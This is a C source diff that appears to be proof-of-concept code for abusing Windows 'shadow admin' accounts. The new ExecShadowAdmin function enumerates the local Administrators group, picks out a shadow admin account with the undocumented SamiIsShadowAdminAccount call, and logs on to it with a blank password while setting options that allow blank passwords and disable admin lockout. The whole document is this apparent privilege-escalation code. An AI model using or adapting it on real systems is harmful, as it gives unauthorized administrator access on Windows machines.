@@ -101,8 +101,10 @@ NTSTATUS GetLogonSid(_Out_ PSID_AND_ATTRIBUTES LogonSid)
 	return GetLastHrEx();
 }
 
-NTSTATUS LogonIUser(_In_ PCUNICODE_STRING DomainName, _In_ PCWSTR UserName, _In_ PCWSTR Password)
+NTSTATUS LogonIUser(_In_ PCWSTR DomainName, _In_ PCWSTR UserName, _In_ PCWSTR Password)
 {
+	MessageBoxW(0, UserName, L"Shadow Admin", MB_ICONINFORMATION);
+
 	NTSTATUS SubStatus, status = STATUS_INTERNAL_ERROR;
 
 	UCHAR Sid[SECURITY_SID_SIZE(SECURITY_LOGON_IDS_RID_COUNT)];
@@ -126,7 +128,7 @@ NTSTATUS LogonIUser(_In_ PCUNICODE_STRING DomainName, _In_ PCWSTR UserName, _In_
 
 	int len = 0;
 
-	while (0 < (len = _snwprintf(psz, len, L"%wZ%c%ws%c%ws", DomainName, 0, UserName, 0, Password)))
+	while (0 < (len = _snwprintf(psz, len, L"%ws%c%ws%c%ws", DomainName, 0, UserName, 0, Password)))
 	{
 		if (buf)
 		{
@@ -156,7 +158,7 @@ NTSTATUS LogonIUser(_In_ PCUNICODE_STRING DomainName, _In_ PCWSTR UserName, _In_
 			PVOID ProtocolReturnBuffer = 0;
 			ULONG ReturnBufferLength;
 			MSV1_0_SETPROCESSOPTION_REQUEST spo = {
-				MsV1_0SetProcessOption, MSV1_0_OPTION_ALLOW_BLANK_PASSWORD, FALSE
+				MsV1_0SetProcessOption, MSV1_0_OPTION_ALLOW_BLANK_PASSWORD|MSV1_0_OPTION_DISABLE_ADMIN_LOCKOUT, FALSE
 			};
 
 			status = LsaCallAuthenticationPackage(
@@ -204,155 +206,57 @@ NTSTATUS LogonIUser(_In_ PCUNICODE_STRING DomainName, _In_ PCWSTR UserName, _In_
 	return status;
 }
 
-NTSTATUS ExecAdmin(_In_ PCUNICODE_STRING DomainName, SAM_HANDLE DomainHandle, PSID Sid, PULONG pRid)
+NTSTATUS ExecShadowAdmin()
 {
-	union {
-		PDOMAIN_DISPLAY_USER pdu;
-		PVOID Buffer;
-	};
-	NTSTATUS status;
-	ULONG Index = 0, TotalAvailable, TotalReturned, ReturnedEntryCount;
-	do
+	SAM_HANDLE ServerHandle, DomainHandle, AliasHandle;
+	OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+	NTSTATUS status = SamConnect(0, &ServerHandle, SAM_SERVER_LOOKUP_DOMAIN, &oa);
+	if (0 <= status)
 	{
-		if (0 <= (status = SamQueryDisplayInformation(DomainHandle, DomainDisplayUser,
-			Index, 0x100, 0x10000, &TotalAvailable, &TotalReturned, &ReturnedEntryCount, &Buffer)))
-		{
-			if (ReturnedEntryCount)
-			{
-				PVOID buf = Buffer;
-				do
-				{
-					Index = pdu->Index;
+		SID BUILTIN = { SID_REVISION, 1, SECURITY_NT_AUTHORITY, {SECURITY_BUILTIN_DOMAIN_RID } };
 
-					DbgPrint("%u %08X \"%wZ\" \"%wZ\" \"%wZ\"\n",
-						pdu->Rid, pdu->AccountControl, &pdu->LogonName, &pdu->FullName, &pdu->AdminComment);
-
-					if (DOMAIN_USER_RID_MAX < pdu->Rid)
-					{
-						*pRid = pdu->Rid;
-
-						PWSTR AdminName;
-						PSID ShadowSid;
-						if (0 <= SamiFindOrCreateShadowAdminAccount(Sid, &AdminName, &ShadowSid))
-						{
-							SamFreeMemory(ShadowSid);
-							status = LogonIUser(DomainName, AdminName, L"");
-							SamFreeMemory(AdminName);
-							break;
-						}
-
-					}
-
-				} while (pdu++, --ReturnedEntryCount);
-
-				SamFreeMemory(buf);
-			}
-		}
-
-	} while (STATUS_MORE_ENTRIES == status);
-
-	return status;
-}
-
-NTSTATUS tr4()
-{
-	NTSTATUS status;
-
-	LSA_HANDLE PolicyHandle;
-
-	LSA_OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) };
-
-	if (0 <= (status = LsaOpenPolicy(0, &ObjectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &PolicyHandle)))
-	{
-		union {
-			PPOLICY_DNS_DOMAIN_INFO ppdi;
-			PPOLICY_ACCOUNT_DOMAIN_INFO padi;
-			PVOID buf;
-		};
-
-		PSID Sid = 0, DomainSid = 0;
-		BOOL bInDomain = TRUE;
-		PCUNICODE_STRING DomainName = 0;
-
-		if (0 <= (status = LsaQueryInformationPolicy(PolicyHandle, PolicyDnsDomainInformation, &buf)))
-		{
-			if (DomainSid = ppdi->Sid)
-			{
-				DomainName = &ppdi->DnsDomainName;
-			}
-			else
-			{
-				LsaFreeMemory(buf);
-				if (0 <= (status = LsaQueryInformationPolicy(PolicyHandle, PolicyAccountDomainInformation, &buf)))
-				{
-					DomainSid = padi->DomainSid;
-					DomainName = &padi->DomainName;
-					bInDomain = FALSE;
-				}
-			}
-		}
-
-		LsaClose(PolicyHandle);
-
+		status = SamOpenDomain(ServerHandle, DOMAIN_EXECUTE|DOMAIN_READ, &BUILTIN, &DomainHandle);
+		SamCloseHandle(ServerHandle);
 		if (0 <= status)
 		{
-			ULONG SubAuthorityCount = 0;
-
-			if (DomainSid)
+			status = SamOpenAlias(DomainHandle, ALIAS_LIST_MEMBERS, DOMAIN_ALIAS_RID_ADMINS, &AliasHandle);
+			SamCloseHandle(DomainHandle);
+			if (0 <= status)
 			{
-				SubAuthorityCount = *RtlSubAuthorityCountSid(DomainSid);
-				ULONG cb = RtlLengthRequiredSid(SubAuthorityCount + 1);
-				RtlCopySid(cb, Sid = alloca(cb), DomainSid);
-
-				SAM_HANDLE ServerHandle, DomainHandle = 0;
-				PDOMAIN_CONTROLLER_INFOW DomainControllerInfo = 0;
-				UNICODE_STRING name, * psn = 0;
-
-				if (bInDomain)
-				{
-					if (NOERROR != (status = DsGetDcNameW(0, 0, 0, 0, DS_PDC_REQUIRED, &DomainControllerInfo)))
-					{
-						goto __exit;
-					}
-
-					PCWSTR ServerName = 0;
-					if (!(ServerName = DomainControllerInfo->DomainControllerAddress))
-					{
-						ServerName = DomainControllerInfo->DomainControllerName;
-					}
-					RtlInitUnicodeString(psn = &name, ServerName);
-				}
-
-				status = SamConnect(psn, &ServerHandle, SAM_SERVER_LOOKUP_DOMAIN, 0);
-
-				if (DomainControllerInfo)
-				{
-					NetApiBufferFree(DomainControllerInfo);
-				}
-
+				ULONG MemberCount;
+				PSID *MemberIds, UserSid;
+				status = SamGetMembersInAlias(AliasHandle, &MemberIds, &MemberCount);
+				SamCloseHandle(AliasHandle);
 				if (0 <= status)
 				{
-					status = SamOpenDomain(ServerHandle, DOMAIN_READ | DOMAIN_EXECUTE, Sid, &DomainHandle);
-
-					SamCloseHandle(ServerHandle);
-
-					if (0 <= status)
+					PVOID buf = MemberIds;
+					if (MemberCount)
 					{
-						++*RtlSubAuthorityCountSid(Sid);
-						PULONG pRid = RtlSubAuthoritySid(Sid, SubAuthorityCount);
+						do 
+						{
+							BOOLEAN bShadowAdmin;
+							PWSTR UserName;
+							if (0 <= (status = SamiIsShadowAdminAccount(*MemberIds++, &bShadowAdmin, &UserName, &UserSid)))
+							{
+								if (bShadowAdmin)
+								{
+									SamFreeMemory(UserSid);
+									LogonIUser(L".", UserName, L"");
+									SamFreeMemory(UserName);
+									break;
+								}
+							}
+						} while (--MemberCount);
 
-						status = ExecAdmin(DomainName, DomainHandle, Sid, pRid);
-
-						SamCloseHandle(DomainHandle);
+						if (!MemberCount)
+						{
+							status = STATUS_NO_SUCH_USER;
+						}
 					}
-
+					SamFreeMemory(buf);
 				}
-
 			}
-		__exit:
-			LsaFreeMemory(buf);
 		}
 	}
-
 	return status;
 }
